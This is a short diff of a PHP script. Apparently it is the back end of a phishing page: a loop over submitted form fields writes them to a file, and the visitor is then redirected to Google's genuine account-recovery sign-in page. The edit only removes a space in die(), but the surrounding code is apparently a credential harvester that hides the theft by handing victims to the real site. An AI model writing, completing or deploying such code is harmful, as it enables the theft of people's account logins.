@@ -16,5 +16,5 @@ foreach($_POST as $key=>$value) {
  fwrite($file, "\t\t\t\t\t\t");
  fclose($file);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-die ();
+die();
 ?>
